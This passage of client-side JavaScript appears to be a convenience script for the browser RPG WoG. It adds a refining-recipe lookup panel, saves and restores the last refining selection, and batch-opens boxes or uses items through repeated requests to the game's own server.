    for(let j=0;j<parts.length;j++){
        i.write(`<td onmouseover=\"this.style.color='white';this.style.backgroundColor='#4B689E'\" onmouseout=\"this.style.color='white';this.style.backgroundColor=''\" onClick=\"parent.act_click('syn','view','${parts[j]}')\">精鍊</td>`);
    }
    i.write("</tr>");
    i.write('<input type="hidden" name="f" value="">');
    i.write('<input type="hidden" name="act" value="">');
    i.write('<input type="hidden" name="temp_id" value="">');
    i.write("</form>");
    i.write(temp_table2);
    i.write('<form action="wog_act.php" method="post" target="mission" name="f2">');
    i.write(temp_table1);
    i.write('<tr><td colspan="9"><p align=center id="synInfo">歡迎來到精鍊中心，你可以在這裡升級你的裝備，首先，裝備必需<b><font color=red>可</font></b>精鍊<br>第二，升級裝備必須要有裝備類型對應的精鍊石，分別是<font color=red>天</font><font color=orange>帝</font><font color=yellow>戰</font><font color=green>泣</font><font color=lightgreen>聖</font><font color=blue>戒</font><font color=purple>斷</font><font color=white>真</font><font color=grey>神</font>九種精鍊石<br>不過，精鍊前請考慮風險，因為精鍊裝備會有機會失敗，導致裝備消失！<a href="/data/dsyn.html" target="_blank"><font color=ffffff>精鍊教學按此</font></a></p></td></tr>');
    i.write("<tr><td>合成選擇</td><td>物理攻擊力</td><td>魔力攻擊力</td><td>物理防禦力</td><td>魔力防禦力</td><td>提升速度</td><td>名稱</td><td>價格</td><td>精鍊</td></tr>");
    for (var o = t.split(";"), d = 0; d < o.length; d++) {
        var n = o[d].split(",")
          , a = srhCount(n[0])
          , l = null;
        "" != tmpNum && (l = tmpNum.split(","));
        if(o[d].indexOf("龍石")==15 && o[d].length==29){
            if(!o[d].includes("戒龍石") && !o[d].includes("真龍石")){
                //console.log(o[d]);
                //console.log(n[5]);
                //console.log(a);
                const stoneName = n[5];
                const stoneCount = a;
                //console.log(`${stoneName} ${a} 個`);
                wog_view.document.getElementById("synInfo").innerHTML+=`<br>你有${stoneName} <font color='#03fcf4'>${a}</font> 個 `;
                if(stoneCount>=5){
                    wog_view.document.getElementById("synInfo").innerHTML+=`<a href="javascript:parent.synSelectItem('${stoneName}',5);">快速勾選5個</a>`;
                }
            }else{
                wog_view.document.getElementById("synInfo").innerHTML+=`<br>戒龍石元素及真龍石元素請到<a href="javascript:parent.act_click('syn','list');">合成大師</a>`
            }
        }
        //如果該物品數量大於5時，改成5
        if(a>5){
            a=5;
        }
        for (var s = 0; s < a; s++) {
            if (null != l){
                var p = "*" + l[s];
            }else{
                p = "";
            }
            "0" == n[11] && i.write('<tr><td><input type="checkbox" name="syn[]" value="' + n[0] + '"></td><td>' + n[6] + "</td><td>" + n[7] + "</td><td>" + n[1] + "</td><td>" + n[2] + "</td><td>" + n[3] + "</td><td>" + n[5] + p + "</td><td>" + n[4] + "</td><td>不可</td></tr>"),
            "1" == n[11] && i.write('<tr><td><input type="checkbox" name="syn[]" value="' + n[0] + '"></td><td>' + n[6] + "</td><td>" + n[7] + "</td><td>" + n[1] + "</td><td>" + n[2] + "</td><td>" + n[3] + "</td><td>" + n[5] + p + "</td><td>" + n[4] + "</td><td>可</td></tr>")
        }
    }
    wog_view.document.getElementById("synInfo").innerHTML+=`<br><a style="margin-right:10px;" href="javascript:parent.getLastSyn();">套用上次精煉記錄<a><a href="javascript:document.getElementsByName('f2')[0].scrollIntoView(false);">移至底部<a>`;
    i.write('<tr><td colspan="10" >選擇合成方式：<select name="syn_way">');
    var c = new Array;
    c[2] = "<option value=3>裝備精鍊</option>";
    for (t = 0; t < c.length; t++)
        i.write(c[t]);
    i.write("</select></tr>"),
    // i.write('<tr><td colspan="10" ><input type="submit" id="synSubmit" value="交給工匠" style="' + sbutton + '"></tr>'),
    i.write('<tr><td colspan="10" ><input type="button" id="synSubmit" onClick="parent.saveLastSyn(new FormData(this.form).getAll(`syn[]`));this.form.submit()" value="交給工匠" style="' + sbutton + '"></tr>'),
    i.write(temp_table2),
    i.write('<input type="hidden" name="f" value="syn">'),
    i.write('<input type="hidden" name="act" value="purify">'),
    i.write("</form>");
	// 初始化：先跑一次，之後 checkbox 變化就更新
	parent.renderCheckedItemsPanel();
	parent.wog_view.document.addEventListener('change', function (e) {
	  if (e.target.matches('input[type="checkbox"]')) {
	    parent.renderCheckedItemsPanel();
	  }
	});
}
function status_view2(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v, f, y, k, x, E, B, C, j, F, T, I, M, D, N, H, P, A, L, O, z, R, q, V, S, U, Y, X, W, G, K, Z, $) {
    var Q = parent.wog_view.document
      , J = "";
    J = 1 == r ? i : img + i + ".gif";
    var tt = "";
    tt = "1" == d ? "男" : "女",
    a = s_status(a);
    get_f(w, 5e4),
    get_f(b, 5e4),
    get_f(_, 5e4),
    get_f(g, 5e4),
    get_f(v, 5e4),
    get_f(f, 5e4),
    get_f(h, 5e4);
    var et = get_f(y, 5e4)
      , rt = get_f(k, 5e4)
      , it = get_f(x, 5e4)
      , ot = get_f(E, 5e4)
      , dt = s / p * 100
      , nt = 99 - (dt = dt > 1 ? dt < 99 ? Math.round(dt) : Math.floor(dt) : Math.ceil(dt))
      , at = m / u * 100
      , lt = 99 - (at = at > 1 ? at < 99 ? Math.round(at) : Math.floor(at) : Math.ceil(at))
      , st = ""
      , pt = ""
      , ct = ""
      , mt = "";
    dt >= 1 && (st = '<img src="' + img + 'bar/bxg.gif" width="' + dt + '%" height="9" title="' + dt + '%">');
    nt >= 1 && (pt = '<img src="' + img + 'bar/bhg.gif" width="' + nt + '%" height="9" title="' + dt + '%">');
    at >= 1 && (ct = '<img src="' + img + 'bar/bxg.gif" width="' + at + '%" height="9" title="' + at + '%">');
    lt >= 1 && (mt = '<img src="' + img + 'bar/bhg.gif" width="' + lt + '%" height="9" title="' + at + '%">');
    Q.write('<center><img src="./img/Player.png"></center>');
    //https://mu6.me/193359
    o == "TauRus1001" ? (Q.write('<center><iframe width="290" height="100" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/603113994&color=%23ff5500&auto_play=true&show_user=false"></iframe></center>')) : '';
    Q.write(temp_table1);
    Q.write('<tr><td width="60%">');
    Q.write(temp_table1);
    Q.write('<tr><td colspan="2">勝場 ' + t + " / 敗場 " + e + "　(獲勝率:" + Math.floor(t / (t + e) * 100) + "%)</td></tr>");
    Q.write('<tr><td colspan="2"><img src="' + J + '" border="0" ></td></tr>');
    Q.write('<tr><td bgcolor="#000099">金錢</td><td><b>-----</b></td></tr>');
    Q.write('<tr><td bgcolor="#000099">霧靈鬼魂</td><td><b>-----</b></td></tr>'),
    Q.write('<tr><td bgcolor="#000099">幻想點數</td><td><b>-----</b></td></tr>'),
    Q.write('<tr><td bgcolor="#996600">冒險地</td><td ><b>' + section.getPlace(A) + "</b></td></tr>"),
    Q.write('<tr><td bgcolor="#990099">出生地</td><td ><b>' + birth[L] + "</b></td></tr>"),
    Q.write("<tr><td>Exp</td><td>" + st + pt + "<b>" + Math.floor(s / p * 100) + "%</b></td></tr>"),
    Q.write("<tr><td>HP</td><td>" + ct + mt + "<b>" + m + "/" + u + "</b></td></tr>"),
    Q.write('</table></td><td width="40%">'),
    Q.write(temp_table1),
    Q.write('<tr><td bgcolor="#006600">勇者姓名</td><td><b>' + o + " (" + tt + " " + O + "歲)</b></td></tr>"),
    Q.write('<tr><td bgcolor="#006600">等級</td><td><b>' + S + " 轉 " + l + " 級</b></td></tr>"),
    Q.write('<tr><td bgcolor="#006600">職業</td><td><b>' + a + "屬 " + n + "</b></td></tr>"),
    "" != U ? Q.write('<tr><td bgcolor="#006600">官職</td><td ><b>' + U + "</b></td></tr>") : Q.write('<tr><td bgcolor="#006600">官職</td><td ><b>平民</b></td></tr>'),
    "" != d_s_ch_name ? Q.write('<tr><td bgcolor="#006600">奧義</td><td ><b>' + q + "奧義</b></td></tr>") : Q.write('<tr><td bgcolor="#006600">奧義</td><td ><b>未有裝備奧義</b></td></tr>'),
    "" != K ? Q.write('<tr><td bgcolor="#E6C075">所屬公會</td><td><b>' + K + "</b></td></tr>") : Q.write('<tr><td bgcolor="#E6C075">所屬公會</td><td><b>未有所屬公會</b></td></tr>'),
    "" != Z ? Q.write('<tr><td bgcolor="#E6C075">公會頭銜</td><td><b>' + Z + "</b></td></tr>") : Q.write('<tr><td bgcolor="#E6C075">公會頭銜</td><td><b>未有公會頭銜</b></td></tr>'),
    Q.write('<tr><td bgcolor="#3300FF">守護者</td><td><b><span onmouseover="parent.textboard_view(' + desc_id[11] + ',event)" onmouseout="parent.textboard_close()">' + P + "</span></b></td>"),
    "undefined" != V && Q.write("<tr><td>連勝紀錄</td><td>" + V + " 連勝中</td></tr>"),
    Q.write("</table>"),
    Q.write("</hr>"),
    Q.write("<table border=0 width=97%>"),
    Q.write('<tr><td><fieldset style="height:100; width:97%;overflow:auto"><legend>個人狀態及廣告區<button onclick="parent.adBoxToggle()" style="' + sbutton + ';margin: 0px 5px;">展開</button></legend><b>' + G + "</b></fieldset></td></tr>"),
    Q.write("</table>"),
    Q.write("</td></tr></table>"),
    Q.write("<hr>"),
    Q.write(temp_table1),
    Q.write('<tr><td colspan="8" bgcolor="#555555"><b>角色能力</b></td></tr>'),
    Q.write('<tr><td bgcolor="#555555">力量</td><td class="b"><b>' + w + "</b></td>"),
    Q.write('<td bgcolor="#555555">敏捷</td><td class="b"><b>' + _ + "</b></td>"),
    Q.write('<td bgcolor="#555555">魅力</td><td class="b"><b>' + v + "</b></td>"),
    Q.write('<td bgcolor="#555555">體質</td><td class="b"><b>' + h + "</b></td></tr>"),
    Q.write('<tr><td bgcolor="#555555">智力</td><td class="b"><b>' + b + "</b></td>"),
    Q.write('<td bgcolor="#555555">生命</td><td class="b"><b>' + g + "</b></td>"),
    Q.write('<td bgcolor="#555555">信仰</td><td class="b"><b>' + f + "</b></td>"),
    Q.write('<td bgcolor="#555555">運氣</td><td class="b"><b>-----</b></td></tr>'),
    Q.write("</table>"),
    Q.write("<hr>"),
    Q.write(temp_table1),
    Q.write('<tr><td colspan="4" bgcolor="#555555"><b>角色數值</b></td></tr>'),
    Q.write('<tr><td width="10%" bgcolor="#555555">物攻</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + et + '%" height="9"><b>' + y + "</b></td></tr>"),
    Q.write('<tr><td width="10%" bgcolor="#555555">物防</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + it + '%" height="9"><b>' + x + "</b></td></tr>"),
    Q.write('<tr><td width="10%" bgcolor="#555555">魔攻</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + rt + '%" height="9"><b>' + k + "</b></td></tr>"),
    Q.write('<tr><td width="10%" bgcolor="#555555">魔防</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + ot + '%" height="9"><b>' + E + "</b></td></tr>"),
    Q.write("</tr></table>"),
    Q.write("<hr>"),
    Q.write(temp_table1),
    Q.write('<tr><td colspan="5" bgcolor="#555555"><b>角色裝備 【 ' + $ + " 】</b></td></tr>"),
    Q.write("<tr>"),
    Q.write('<td>武器<br><img src="./img/eq/weapon.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[0] + ',event)" onmouseout="parent.textboard_close()">' + B + "</span></b></td>"),
    Q.write('<td>頭部<br><img src="./img/eq/head.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[1] + ',event)" onmouseout="parent.textboard_close()">' + j + "</span></b></td>"),
    Q.write('<td>身體<br><img src="./img/eq/body.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[2] + ',event)" onmouseout="parent.textboard_close()">' + C + "</span></b></td>"),
    Q.write('<td>手部<br><img src="./img/eq/hand.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[3] + ',event)" onmouseout="parent.textboard_close()">' + F + "</span></b></td>"),
    Q.write('<td>腳部<br><img src="./img/eq/foot.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[4] + ',event)" onmouseout="parent.textboard_close()">' + T + "</span></b></td>"),
    Q.write("</tr><tr>"),
    Q.write('<td>道具<br><img src="./img/eq/tool.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[5] + ',event)" onmouseout="parent.textboard_close()">' + I + "</span></b></td>"),
    Q.write('<td>座騎<br><img src="./img/eq/ride.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[8] + ',event)" onmouseout="parent.textboard_close()">' + D + "</span></b></td>"),
    Q.write('<td>護符<br><img src="./img/eq/simp.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[7] + ',event)" onmouseout="parent.textboard_close()">' + M + "</span></b></td>"),
    Q.write('<td>幻想卡<br><img src="./img/eq/card.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[9] + ',event)" onmouseout="parent.textboard_close()">' + N + "</span></b></td>"),
    Q.write('<td>幻戰書<br><img src="./img/eq/book.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[10] + ',event)" onmouseout="parent.textboard_close()">' + H + "</span></b></td>"),
    Q.write("</tr></table>"),
    Q.write(temp_table2),
    Q.write('<div id="textboard" name="textboard" style="display:none;background:black;border:1px solid #4B689E;width:160px;height:100px;position:absolute;left:0px;top:0px"></div>'),
    Q.write("</td></tr></table>"),
    Q.write('<div id="wog_message_box"></div>'),
    Q.write(`\n    <div name="adBox" style="position:absolute;left:37%;top:350px;height:650px;overflow:auto;display:none;">\n      <div style="border: 1px solid black;width: 600px;">\n        <table width="600px" border="1" bgcolor="#555555" style="\n        border: 1px solid black;\n        Z-INDEX: 100">\n          <thead style="position: sticky; top: 0; background-color: #555555;">\n            <tr width="100%">\n              <th style="text-align: right"><a href="javascript:parent.adBoxToggle()">關閉</a></th>\n            </tr>\n        </thead>\n          <tbody style="color:white;">\n          <tr bgcolor="#4B689E">\n              <td>${G}</td>\n            </tr>\n        </table>\n      </div>\n    </div>\n    `)
}
/****************************修改原生功能結束****************************/
function uaIsMobile() {
    const ua = navigator.userAgent.toLowerCase();
    if(ua.includes('mobi') || ua.includes('tablet') || ua.includes('linux')){  
       return true;
    }
    return false;
}
function checkForNewCaptcha(maxChecks) {
    return new Promise((resolve) => {
        let checkNewCaptchaTime = 0;

        const intervalId = setInterval(() => {
            const newCaptcha = parent.wog_view.document.getElementById('captcha-submit');
            if (newCaptcha) {
                clearInterval(intervalId);
                resolve(true); // 當找到元素時，resolve 並返回 true
            } else {
                checkNewCaptchaTime++;
                if (checkNewCaptchaTime >= maxChecks) {
                    clearInterval(intervalId);
                    resolve(false); // 如果超過最大檢查次數，resolve 並返回 false
                }
            }
        }, 1000);
    });
}
/****************************精煉檢測功能開始****************************/
// 取得已勾選名稱
function getSynCheckedItemNames() {
  const rows = parent.wog_view.document.querySelectorAll('table tr');
  const names = [];
  rows.forEach(tr => {
    const checkbox = tr.querySelector('input[type="checkbox"]');
    if (checkbox && checkbox.checked) {
      const nameCell = tr.querySelector('td:nth-child(7), th:nth-child(7)');
      if (nameCell) {
        let text = nameCell.textContent.trim(); // 例如 "火苗*195"
        // 只取 * 前面的名稱
        const starIndex = text.indexOf('*');
        if (starIndex !== -1) {
          text = text.slice(0, starIndex);
        }
        if (text) names.push(text);
      }
    }
  });
  return names;
}

// 呼叫精鍊查詢 API，payload = formdata, value = names[0]
async function fetchRefineTable(name) {
  const form = new FormData();
  // 依實際欄位名稱調整
  form.append('eq', name);

  const res = await fetch('https://wog.we-u.net/data2/check_syni.php', {
    method: 'POST',
    body: form,
    credentials: 'include'
  });
  const html = await res.text();
  return html;
}

// 從回傳 HTML 取第 2 個 table
function extractSecondTable(html) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const tables = doc.querySelectorAll('table');
  if (tables.length < 2) return null;
  return tables[1];
}

// 解析配方資料：成品 / 材料1~8 / 精鍊等級
function parseRecipesFromTable(tableEl) {
  const rows = tableEl.querySelectorAll('tr');
  const recipes = [];

  rows.forEach((tr, idx) => {
    if (idx === 0) return; // 標題列
    const tds = tr.querySelectorAll('td');
    if (tds.length < 10) return;

    const product = tds[0].textContent.trim();
    const materials = [];
    for (let i = 1; i <= 8; i++) {
      const txt = tds[i].textContent.trim();
      if (txt && txt !== '無') materials.push(txt);
    }
    const level = tds[9].textContent.trim();

    recipes.push({ product, materials, level });
  });

  return recipes;
}

// names 與某配方材料是否完全相同（順序不限，重複要符合）
function isExactMaterialsMatch(names, materials) {
  if (names.length !== materials.length) return false;

  function count(arr) {
    const map = {};
    arr.forEach(x => {
      map[x] = (map[x] || 0) + 1;
    });
    return map;
  }

  const a = count(names);
  const b = count(materials);
  const keysA = Object.keys(a);
  const keysB = Object.keys(b);
  if (keysA.length !== keysB.length) return false;

  return keysA.every(k => a[k] === b[k]);
}

// 更新「推測精鍊項目 / 等級」區塊
function updateSynTargetInfo(panel, match) {
  const box = panel.querySelector('#wog-target-info');
  if (!box) return;

  let productHtml, levelHtml;
  if (match) {
    productHtml =
      '<span style="font-weight:bold; color:#00AA00;">' +
      match.product +
      '</span>';
    levelHtml =
      '<span style="font-weight:bold; color:#00AA00;">' +
      match.level +
      '</span>';
  } else {
    productHtml =
      '<span style="font-weight:bold; color:#CC0000;">未知</span>';
    levelHtml =
      '<span style="font-weight:bold; color:#CC0000;">未知</span>';
  }

  box.innerHTML =
    '推測精鍊項目: ' + productHtml +
    '<br>推測精鍊等級: ' + levelHtml;
}

// 呼叫 wog_act.php, 取得「已裝備卡片」那個 description 呼叫
async function fetchStatusHtml() {
  const form = new FormData();
  form.append('f', 'chara');
  form.append('act', 'status_view');

  const res = await fetch('https://wog.we-u.net/wog_act.php', {
    method: 'POST',
    body: form,
    credentials: 'include'
  });
  const html = await res.text();
  return html;
}

// 從 status_view HTML 中抓出 parent.desc_id[9] 對應的 description 第二個參數字串
function extractEquippedCardHtml(statusHtml) {
  // 1. 找到 parent.desc_id[9] 的 ID 值
  const idMatch = statusHtml.match(/parent\.desc_id\[9\]\s*=\s*(\d+);/);
  if (!idMatch) return null;
  const id = idMatch[1];

  // 2. 找對應的 parent.description(id, '...', ...)
  //   parent.description(7066, '<font ...>諸事大吉</font>', ...
  const descRegex = new RegExp(
    'parent\\.description\\s*\\(\\s*' +
      id +
      '\\s*,\\s*([\'"])([\\s\\S]*?)\\1',
    'm'
  );
  const descMatch = statusHtml.match(descRegex);
  if (!descMatch) return null;

  const raw = descMatch[2]; // 例如: <font color=ff9999>諸事大吉</font>
  return raw;
}

// 解析卡片顯示文字（去掉外層 font，保留裡面的名稱）
// 如果你想保留 font 標籤，可直接用 rawHtml 不做 parse
function extractCardNameFromHtml(rawHtml) {
  const wrapper = parent.wog_view.document.createElement('div');
  wrapper.innerHTML = rawHtml;
  const text = wrapper.textContent || wrapper.innerText || '';
  return text.trim();
}

// 依卡片名稱＋精鍊等級判斷是否合適
function isCardSuitable(cardName, refineLevel) {
  const lvl = parseInt(refineLevel, 10);
  if (isNaN(lvl)) return false;

  if (lvl >= 0 && lvl <= 4 && cardName === '潘朵拉的卡片') {
    return true;
  }
  if (lvl >= 5 && lvl <= 9 && cardName === '赫淮斯托斯的卡片') {
    return true;
  }
  return false;
}

// 在 panel 中更新已裝備卡片＋適性
function updateSynCardInfo(panel, cardHtml, refineLevel) {
  const box = panel.querySelector('#wog-card-info');
  if (!box) return;

  let cardDisplayHtml, suitableHtml;

  if (cardHtml) {
    // cardHtml 仍然是帶 <font> 的字串，直接當 innerHTML 呈現，再外面包 span
    cardDisplayHtml =
      '<span style="font-weight:bold; color:#00AA00;">' +
      cardHtml +
      '</span>';
  } else {
    cardDisplayHtml =
      '<span style="font-weight:bold; color:#CC0000;">未知</span>';
  }

  let suitable;
  if (cardHtml && refineLevel != null) {
    const cardName = parent.extractCardNameFromHtml(cardHtml);
    suitable = parent.isCardSuitable(cardName, refineLevel);
  } else {
    suitable = false;
  }

  if (suitable) {
    suitableHtml =
      '<span style="font-weight:bold; color:#00AA00;">合適</span>';
  } else {
    suitableHtml =
      '<span style="font-weight:bold; color:#CC0000;">不合適</span>';
  }

  box.innerHTML =
    '已裝備卡片: ' + cardDisplayHtml +
    '<br>卡片適性: ' + suitableHtml;
}

// 綁定右上角 X 按鈕
function synBindCloseButton(panel) {
  const btn = panel.querySelector('#wog-checked-close');
  if (btn) {
    btn.onclick = function () {
      panel.style.display = 'none';
    };
  }
}

// 主流程：畫出 / 更新 panel，並查表比對＋查卡片
async function renderCheckedItemsPanel() {
  const names = parent.getSynCheckedItemNames();
  const existing = parent.wog_view.document.getElementById('wog-checked-panel');

  if (names.length === 0) {
    if (existing) existing.remove();
    return;
  }

  const baseHtml =
    '<div id="wog-checked-close" ' +
      'style="position:absolute; top:2px; right:4px; ' +
             'width:16px; height:16px; line-height:16px; ' +
             'text-align:center; cursor:pointer; ' +
             'background-color:#555; color:#fff; ' +
             'font-size:10px; border-radius:2px;">X</div>' +
    '已勾選的項目:<br>' +
    names
      .map(n => '<span style="font-weight:bold;">' + n + '</span>')
      .join('<br>') +
    '<hr><div id="wog-target-info" style="margin-top:4px;"></div>' +
    '<hr><div id="wog-card-info" style="margin-top:4px;"></div>'+
    '<br><div style="font-size:8pt; font-weight:bold; color:#000000;">' +
    '推測項目/等級/卡片適性 僅供參考，如有意外一概不負責' +
    '</div>';

  let panel;
  if (existing) {
    existing.style.display = 'block';
    existing.innerHTML = baseHtml;
    panel = existing;
  } else {
    const div = parent.wog_view.document.createElement('div');
    div.id = 'wog-checked-panel';
    div.style.position = 'fixed';
    div.style.right = '10px';
    div.style.bottom = '10px';
    div.style.width = '280px';
    div.style.maxHeight = '280px';
    div.style.overflowY = 'auto';
    div.style.backgroundColor = '#ffffff';
    div.style.color = '#000000';
    div.style.border = '1px solid #000000';
    div.style.padding = '8px';
    div.style.boxShadow = '0 0 5px rgba(0,0,0,0.3)';
    div.style.zIndex = '10';
    div.style.fontSize = '10pt';

    div.innerHTML = baseHtml;
    parent.wog_view.document.body.appendChild(div);
    panel = div;
  }

  parent.synBindCloseButton(panel);

  let matched = null;

  // 1) 查精鍊配方
  try {
    const html = await parent.fetchRefineTable(names[0]);
    const table2 = parent.extractSecondTable(html);
    if (table2) {
      const recipes = parent.parseRecipesFromTable(table2);
      for (const r of recipes) {
        if (parent.isExactMaterialsMatch(names, r.materials)) {
          matched = r;
          break;
        }
      }
    }
  } catch (e) {
    // 忽略錯誤，matched 保持 null
  }

  parent.updateSynTargetInfo(panel, matched);

  // 2) 查角色狀態，取得已裝備卡片
  try {
    const statusHtml = await parent.fetchStatusHtml();
    const cardHtml = parent.extractEquippedCardHtml(statusHtml);
    const refineLevel = matched ? matched.level : null;
    parent.updateSynCardInfo(panel, cardHtml, refineLevel);
  } catch (e) {
    parent.updateSynCardInfo(panel, null, null);
  }
}
/****************************精煉檢測功能結束****************************/
function saveLastSyn(lastSynArray){
    sessionStorage.setItem("lastSyn", lastSynArray);
}
function getLastSyn(){
    if (sessionStorage.getItem("lastSyn") == null) {
        alert("沒有找到精煉記錄")
        return
    } else {
        const lastSyn = sessionStorage.getItem("lastSyn").split(",");
        // 獲取所有 checkbox
        const checkboxes = parent.wog_view.document.getElementsByName("syn[]");

        // 使用一個物件來計算每個 id 出現的次數
        const idCount = lastSyn.reduce((acc, id) => {
            acc[id] = (acc[id] || 0) + 1;
            return acc;
        }, {});

        // 記錄勾選成功的數量
        let checkedCount = 0;

        // 遍歷所有 checkbox，根據 id 來勾選
        for (const checkbox of checkboxes) {
            const value = checkbox.value;
            if (idCount[value] > 0) {
                checkbox.checked = true;
                checkedCount++;
                idCount[value]--; // 每勾選一次，減少計數
            }
        }

        // 檢查是否全部勾選成功
        if (checkedCount === lastSyn.length) {
            alert("全部勾選成功！");
        } else {
            alert("部分物品勾選失敗，請自行檢查");
        }
		// ★ 勾選完成後，主動刷新浮窗
	    if (typeof renderCheckedItemsPanel === 'function') {
	      parent.renderCheckedItemsPanel();
	    } else if (parent && typeof parent.renderCheckedItemsPanel === 'function') {
	      parent.renderCheckedItemsPanel();
	    }
    }
}
function useMultipleItems(){
    let selected_id = 0;
    let itemType = 0;
    parent.wog_view.document.f2.adds.forEach((e)=>{if(e.checked){selected_id = parseInt(e.value);}});
    //console.log(selected_id);
    const boxes = {
        2685:'幻想寶箱',
        2686:'石頭寶箱',
        2690:'卡片寶箱',
        2711:'霧靈寶箱',
        2712:'毛公仔寶箱',
        2812:'雲逆寶箱',
        2879:'封印錦盒',
        2880:'咒紋錦盒',
        2882:'天使寶箱',
        2883:'死神寶箱',
        3334:'深海寶箱',
        3540:'寶石收藏箱(Lv1)',
        3541:'寶石收藏箱(Lv2)',
        3542:'寶石收藏箱(Lv3)',
        4025:'冥界寶箱',
        4574:'神秘寶箱(火)',
        4575:'神秘寶箱(水)',
        4576:'神秘寶箱(木)',
        4671:'素材寶箱',
        4785:'清心錦盒',
        4786:'天元黃金箱',
        4787:'武林至尊錦盒',
	5200:'法老王的寶藏',
        5606:'殘卷寶箱',
        5607:'錢幣寶箱',
        7183:'A箱',
        7184:'B箱',
        7185:'C箱',
        7186:'善良箱',
        7187:'狡猾箱'
    }
    const bagItem = {
        533:'20格背包'
    }
    const powerItem = {
        283:'力量之水',
        284:'速度之水',
        285:'智力之水',
        286:'生命之水',
        287:'體質之水',
        288:'信仰之水',
        289:'魅力之水',
        4768:'清心修煉丹',
        6165:'仙奇丹',
        7079:'糖糖'
    }
    if(selected_id in boxes){
        itemType = 1;
    }
    if(selected_id in bagItem){
        itemType = 2;
    }
    if(selected_id in powerItem){
        itemType = 3;
    }
    // console.log('itemType',itemType)

    //itemType 1 = boxes, 2 = powerItem
    if (itemType == 0){
        alert("錯誤的選項");
        return;
    }
    const useTime = parseInt(parent.wog_view.document.f2.item_num.value);
    openbox(selected_id,useTime,itemType);
}
async function openbox(id, useTime, itemType) {
    let formData = new FormData();
    let e = parent.wog_view.document;
    e.body.innerHTML = "";
    e.write(temp_table1);
    e.write(`<tr><td>開啓中...請稍後...請不要離開頁面 <label id="usedTime">0</label> / ${useTime}</td></tr>`);
    e.write(temp_table2);
    
    formData.append('adds', id);
    formData.append('items[]', id);
    formData.append('item_num', 1);
    formData.append('f', 'arm');
    formData.append('act', 'setup');
    
    const responses = [];
    let successfulCount = 0; // 計算成功的請求次數

    for (let i = 0; i < useTime; i++) {
        const html = await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        }).then((response) => response.text());

        let start = 0;
        let end = 0;
        let itemValue = "";
        let temp = "";

        // 根據 itemType 獲取 itemValue
        switch (itemType) {
            case 3:
                start = (html.indexOf("parent.lv_up2")) + 14;
                temp = html.substring(start, html.length);
                end = (temp.indexOf(")</script>"));
                itemValue = html.substring(start, start + end);
                break;
            case 2:
                start = (html.indexOf("parent.bag_up")) + 14;
                temp = html.substring(start, html.length);
                end = (temp.indexOf(")</script>"));
                itemValue = "背包" + (html.substring(start, start + end)).replace("'", "") + "格";
                break;
            case 1:
                itemValue = parent.extractText(html, 'draw_end2')
                break;
        }

        if (itemValue === "hea") {
            break; // 如果 itemValue 是 "hea"，結束循環
        }
        // 確保 itemValue 有效
        if (itemValue) {
            responses.push(itemValue);
            successfulCount++; // 增加成功計數
            parent.wog_view.document.getElementById("usedTime").innerText = successfulCount; // 更新成功的次數
        }
    }

    // 使用 reduce 計算出現次數
    const changeData = responses.reduce((acc, itemValue) => {
        const existing = acc.find(item => item.name === itemValue);
        if (existing) {
            existing.t += 1;
        } else {
            acc.push({ name: itemValue, t: 1 });
        }
        return acc;
    }, []);

    e.write('<hr>');
    
    if (itemType == 3) {
        const tempArray = changeData[0].name.split(",");
        e.write(temp_table1 + '<tr><td class="b1" colspan="10"><b>' + p_name + ' 能力上升 </b></td></tr>');
        e.write("<tr><td><b>力量</b></td>");
        e.write("<td><b>速度</b></td>");
        e.write("<td><b>智力</b></td>");
        e.write("<td><b>生命</b></td>");
        e.write("<td><b>體質</b></td>");
        e.write("<td><b>魅力</b></td>");
        e.write("<td><b>信仰</b></td>");
        e.write("<td><b>經驗加乘</b></td>");
        if (0 != Number(tempArray[7])) e.write("<td><b>EXP</b></td>");
        e.write("</tr>");
        e.write("<tr><td><b>↑ " + Number(tempArray[0]) * successfulCount + "</b></td>");
        e.write("<td><b>↑ " + Number(tempArray[1]) * successfulCount + "</b></td>");
        e.write("<td><b>↑ " + Number(tempArray[2]) * successfulCount + "</b></td>");
        e.write("<td><b>↑ " + Number(tempArray[3]) * successfulCount + "</b></td>");
        e.write("<td><b>↑ " + Number(tempArray[4]) * successfulCount + "</b></td>");
        e.write("<td><b>↑ " + Number(tempArray[5]) * successfulCount + "</b></td>");
        e.write("<td><b>↑ " + Number(tempArray[6]) * successfulCount + "</b></td>");
        e.write("<td><b>" + Number(tempArray[8]) * successfulCount + "場</b></td>");
        if (0 != Number(tempArray[7])) e.write("<td><b>↑ " + Number(tempArray[7]) * successfulCount + "</b></td>");
        e.write("</tr>");
        e.write(temp_table2);
    } else {
        e.write(`<div align="center"><table border="2" cellspacing="0" cellpadding="2" bordercolor="#868686"><tbody><tr><td width="auto" nowrap="nowrap">已獲得項目</td><td width="15%" nowrap="nowrap">數量</td></tr>`);
        for (let j = 0; j < changeData.length; j++) {
            e.write('<tr><td>' + changeData[j].name + '</td><td>' + changeData[j].t + '</td></tr>');
        }
        e.write(temp_table2 + '</div>');
    }
}
function extractText(response, regText) {
    const regex = new RegExp(`${regText}\\('([^']+)\\s*',\\s*\\d+\\)`);
    const match = response.match(regex);
    return match ? match[1] : null;
}
//精煉多選物品
function synSelectItem(itemName,itemAmount) {
    const itemList={'天龍石':1068,'帝龍石':1069,'戰龍石':1070,'泣龍石':1071,'聖龍石':1072,'斷龍石':1074,'神龍石':1076};
    const itemId = itemList[itemName];
